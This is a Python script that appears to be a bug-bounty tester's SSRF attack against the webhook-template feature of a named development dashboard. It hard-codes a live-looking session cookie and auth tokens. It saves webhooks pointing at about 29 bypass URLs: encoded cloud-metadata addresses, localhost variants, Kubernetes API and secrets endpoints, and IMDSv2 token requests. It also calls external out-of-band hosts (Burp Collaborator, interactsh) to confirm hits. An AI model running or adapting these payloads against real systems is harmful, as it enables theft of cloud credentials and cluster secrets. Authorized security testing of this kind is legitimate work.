#!/usr/bin/env python3
"""
SSRF Bypass Script — Create webhook templates with all bypass payloads.
Then attempt to trigger each via campaign test send.
"""

import subprocess
import json
import time
import re
import os
import threading
from datetime import datetime, timezone

TARGET = "https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com"
AG = "69c8d257629242005dba8746"
USER_ID = "69c8d258629242005dba8850"
BURP = "ioaotfq5cntio10oir563kvkdbj27svh.oastify.com"

COOKIE = (
    "i18next=en; "
    "sign_in_email=venu17%2B3ytlztjh%40wearehackerone.com; "
    "remember_login_enc_v1=%242%24%2BNEHL07HulteW1IZd8msag%3D%3D%24bmogoUhLR3JXAHPzqTXq%2FLVSBvwxkLmE8HzxeObbktbaT4A0AeovHWx2fHq1%0AxHIp; "
    "_session_id=8395a904b64f05784979cdef1bc47352; "
    "ag_id___69c8d257629242005dba86a5=69c8d257629242005dba8746; "
    "f_ag_id___69c8d257629242005dba86a5=69c8d257629242005dba8746; "
    "authy_remember_device=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdDRG9RY21WdFpXMWlaWEpmYldWR09neGxlSEJwY21WelZUb2dRV04wYVhabFUzVndjRzl5ZERvNlZHbHRaVjlwZEdoYWIyNWxXd2hKZFRvSlZHbHRaUTJJangvQVUydVdWZ2s2RFc1aGJtOWZiblZ0YVFKZkFUb05ibUZ1YjE5a1pXNXBCam9OYzNWaWJXbGpjbThpQnpVUU9nbDZiMjVsU1NJSVZWUkRCam9HUlVaSklnaFZWRU1HT3cxVVNYVTdDQTJJangvQVUydVdWZ2s3Q1drQ1h3RTdDbWtHT3dzaUJ6VVFPd3hBQ1RvUlpHVjJaV3h2Y0dWeVgybGtTU0lkTmpsak9HUXlOVGcyTWpreU5ESXdNRFZrWW1FNE9EVXdCanNOVkE9PSIsImV4cCI6IjIwMjYtMDQtMjhUMDg6MjE6NDEuNDIwWiIsInB1ciI6bnVsbH19--8eada447233c614c77d2e44632ec5f5e5e7ee109"
)

interactions = []

def log(msg):
    print(f"[{datetime.now(timezone.utc).strftime('%H:%M:%S')}] {msg}", flush=True)

def get_csrf(page_path):
    cmd = [
        "curl", "-s", "-L",
        "-H", f"Cookie: {COOKIE}",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        f"{TARGET}{page_path}"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    m = re.search(r'name="csrf-token"\s+content="([^"]+)"', result.stdout)
    return m.group(1) if m else None

def api_call(method, path, body=None, csrf=None, referer=None):
    cmd = [
        "curl", "-s", "-w", "\n__STATUS__%{http_code}",
        "-X", method,
        "-H", f"Cookie: {COOKIE}",
        "-H", f"X-Csrf-Token: {csrf}",
        "-H", "Content-Type: application/json",
        "-H", "Accept: application/json",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", f"Origin: {TARGET}",
        "-H", "Sec-Fetch-Site: same-origin",
        "-H", "Sec-Fetch-Mode: cors",
        "-H", "Sec-Fetch-Dest: empty",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    ]
    if referer:
        cmd.extend(["-H", f"Referer: {referer}"])
    if body:
        cmd.extend(["-d", json.dumps(body)])
    cmd.append(f"{TARGET}{path}")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    output = result.stdout
    m = re.search(r"__STATUS__(\d+)$", output)
    status = int(m.group(1)) if m else 0
    resp = output[:output.rfind("__STATUS__")] if m else output
    return status, resp

def start_interactsh():
    gopath = subprocess.check_output(["go", "env", "GOPATH"]).decode().strip()
    client = os.path.join(gopath, "bin", "interactsh-client")
    proc = subprocess.Popen(
        [client, "-v", "-poll-interval", "3", "-json"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    domain = None
    deadline = time.time() + 15
    while time.time() < deadline:
        line = proc.stderr.readline()
        m = re.search(r"([a-z0-9]+\.oast\.\w+)", line)
        if m:
            domain = m.group(1)
            break
    return proc, domain

def collect_oob(proc, duration):
    global interactions
    deadline = time.time() + duration
    while time.time() < deadline:
        line = proc.stdout.readline()
        if line.strip():
            try:
                data = json.loads(line.strip())
                interactions.append(data)
                proto = data.get("protocol", "?")
                src = data.get("remote-address", "?")
                fid = data.get("full-id", "?")
                log(f"  *** OOB [{proto}] from {src}: {fid[:60]}")
            except json.JSONDecodeError:
                pass
        time.sleep(0.2)

def main():
    log("=" * 70)
    log("SSRF BYPASS TESTING — All Payloads")
    log("=" * 70)

    # Start OOB
    log("\nStarting interactsh...")
    iproc, oob = start_interactsh()
    log(f"OOB domain: {oob}")
    collector = threading.Thread(target=collect_oob, args=(iproc, 600), daemon=True)
    collector.start()

    # All bypass payloads
    PAYLOADS = [
        # Metadata IP bypasses
        ("bypass-decimal-ip", "http://2852039166/latest/meta-data/", "GET", {}),
        ("bypass-hex-ip", "http://0xa9fea9fe/latest/meta-data/", "GET", {}),
        ("bypass-octal-ip", "http://0251.0376.0251.0376/latest/meta-data/", "GET", {}),
        ("bypass-hex-dotted", "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/", "GET", {}),
        ("bypass-ipv6-mapped", "http://[::ffff:169.254.169.254]/latest/meta-data/", "GET", {}),
        ("bypass-ipv6-hex", "http://[::ffff:a9fe:a9fe]/latest/meta-data/", "GET", {}),
        ("bypass-nip-io", "http://169.254.169.254.nip.io/latest/meta-data/", "GET", {}),
        ("bypass-sslip-io", "http://169.254.169.254.sslip.io/latest/meta-data/", "GET", {}),
        ("bypass-at-sign", "http://anything@169.254.169.254/latest/meta-data/", "GET", {}),
        ("bypass-mixed-encoding", "http://169.254.0xa9fe/latest/meta-data/", "GET", {}),
        ("bypass-padding-zero", "http://169.254.169.0254/latest/meta-data/", "GET", {}),

        # Localhost bypasses
        ("bypass-localhost-decimal", "http://2130706433/", "GET", {}),
        ("bypass-localhost-hex", "http://0x7f000001/", "GET", {}),
        ("bypass-localhost-octal", "http://0177.0.0.1/", "GET", {}),
        ("bypass-localhost-zero", "http://0.0.0.0/", "GET", {}),
        ("bypass-localhost-short", "http://0/", "GET", {}),
        ("bypass-localhost-ipv6", "http://[::1]/", "GET", {}),
        ("bypass-localhost-ipv6-mapped", "http://[::ffff:127.0.0.1]/", "GET", {}),
        ("bypass-localhost-nip", "http://127.0.0.1.nip.io/", "GET", {}),
        ("bypass-localhost-padding", "http://127.0.0.01/", "GET", {}),

        # Kubernetes (different IP — may not be blocked)
        ("bypass-k8s-api", "https://kubernetes.default.svc/api/v1/namespaces", "GET", {}),
        ("bypass-k8s-fqdn", "https://kubernetes.default.svc.cluster.local/api/v1/namespaces", "GET", {}),
        ("bypass-k8s-secrets", "https://kubernetes.default.svc/api/v1/secrets", "GET", {}),

        # Redirect via Burp Collaborator (set up redirect rule in Burp)
        ("bypass-redirect-collab", f"https://{BURP}/redirect", "GET", {}),

        # IMDSv2 with header injection using bypass IPs
        ("bypass-imdsv2-decimal", "http://2852039166/latest/api/token", "PUT", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}),
        ("bypass-imdsv2-nip", "http://169.254.169.254.nip.io/latest/api/token", "PUT", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}),
        ("bypass-imdsv2-hex", "http://0xa9fea9fe/latest/api/token", "PUT", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}),
        ("bypass-imdsv2-ipv6", "http://[::ffff:a9fe:a9fe]/latest/api/token", "PUT", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}),

        # OOB confirmation with interactsh
        ("bypass-oob-check", f"https://bypass-check.{oob}", "GET", {}),
    ]

    results = []
    total = len(PAYLOADS)

    for i, (name, url, method, headers) in enumerate(PAYLOADS, 1):
        log(f"\n[{i}/{total}] {name}")
        log(f"  URL: {url}")
        log(f"  Method: {method} | Headers: {headers}")

        # Get fresh CSRF for each request
        csrf = get_csrf(f"/engagement/templates_and_media/webhook_templates/{AG}/new")
        if not csrf:
            log("  CSRF failed, retrying...")
            csrf = get_csrf(f"/engagement/campaigns/new?app_group_id={AG}")
        if not csrf:
            log("  CSRF FAILED — skipping")
            results.append({"name": name, "url": url, "status": "csrf_fail"})
            continue

        # Create template
        body = {
            "name": name,
            "description": None,
            "tag_names": [],
            "webhook_body": "{}",
            "webhook_body_type": "json",
            "webhook_method": method,
            "territory_ids": [],
            "api_identifier": "",
            "webhook_url": url,
            "webhook_headers": headers,
        }

        status, resp = api_call(
            "POST",
            f"/engagement/webhook_templates/undefined?app_group_id={AG}",
            body=body,
            csrf=csrf,
            referer=f"{TARGET}/engagement/templates_and_media/webhook_templates/{AG}/new",
        )
        log(f"  Save: {status} — {resp[:120]}")

        save_result = "saved" if status == 200 else f"fail_{status}"
        resp_preview = resp[:200]

        # Check if URL was rejected at save time
        if "not available" in resp.lower() or "invalid" in resp.lower() or "blocked" in resp.lower():
            log(f"  *** BLOCKED AT SAVE: {resp[:200]}")
            save_result = "blocked_save"

        results.append({
            "name": name,
            "url": url,
            "method": method,
            "headers": headers,
            "save_status": status,
            "save_result": save_result,
            "response": resp_preview,
        })

        time.sleep(0.5)

    # Wait for OOB
    log(f"\n{'='*70}")
    log("Waiting 30s for OOB interactions...")
    time.sleep(30)

    # Summary
    log(f"\n{'='*70}")
    log("RESULTS SUMMARY")
    log(f"{'='*70}")

    saved = [r for r in results if r.get("save_result") == "saved"]
    blocked = [r for r in results if "block" in str(r.get("save_result", ""))]
    failed = [r for r in results if r.get("save_result", "").startswith("fail")]

    log(f"\nSaved: {len(saved)} | Blocked: {len(blocked)} | Failed: {len(failed)}")

    log(f"\n--- Saved templates (ready to trigger via Send Test) ---")
    for r in saved:
        log(f"  {r['name']}: {r['url']}")

    if blocked:
        log(f"\n--- Blocked at save ---")
        for r in blocked:
            log(f"  {r['name']}: {r['url']} — {r['response'][:100]}")

    log(f"\n--- OOB Interactions: {len(interactions)} ---")
    for x in interactions:
        log(f"  {json.dumps(x, indent=2)[:500]}")

    # Save full results
    with open("/workspace/ssrf_bypass_results.json", "w") as f:
        json.dump({
            "oob_domain": oob,
            "results": results,
            "interactions": interactions,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }, f, indent=2)

    log(f"\nResults saved to /workspace/ssrf_bypass_results.json")

    if iproc:
        iproc.terminate()

if __name__ == "__main__":
    main()
